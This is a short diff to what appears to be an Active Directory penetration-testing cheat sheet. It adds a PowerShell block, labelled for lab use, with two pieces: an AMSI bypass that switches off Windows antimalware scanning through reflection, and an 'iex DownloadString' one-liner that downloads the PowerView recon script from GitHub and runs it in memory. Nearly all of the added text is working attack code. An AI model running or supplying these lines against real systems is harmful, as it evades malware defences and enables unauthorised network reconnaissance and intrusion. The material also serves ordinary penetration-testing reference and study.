@@ -700,6 +700,19 @@ foreach ($user in $users) {
 ```
 
 
+----------------
+
+```
+# AMSI bypass (lab/testing)
+$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static')
+$amsi.SetValue($null,$true)
+
+# Load Powerview in memory
+iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')
+
+```
+
+
 
 ## 6.1 Do not require Kerberos preauthentication (AS-REP roasting)
 ```powershell
